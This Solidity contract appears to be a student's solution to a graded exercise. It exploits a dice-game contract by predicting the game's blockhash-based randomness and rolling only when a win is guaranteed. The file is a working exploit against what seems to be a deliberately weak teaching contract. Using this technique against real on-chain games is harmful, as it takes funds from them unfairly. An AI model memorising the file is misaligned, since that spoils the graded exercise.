pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    // function withdraw(address payable recipient, uint256 riggedRollBalance) public onlyOwner {
    //     recipient.transfer(riggedRollBalance);
    // }
     function withdraw(address to, uint256 amount) public onlyOwner {

        (bool success, ) = to.call{value: amount}("");
        require(success, "Transfer failed!");
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public {
        require(address(this).balance >= .002 ether, "Insufficient balance");
        uint256 nonce = diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        uint256 roll = uint256(hash) % 16;

       
        require(roll <= 5, "Not a winning roll");

        diceGame.rollTheDice{value: 0.002 ether}();
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}
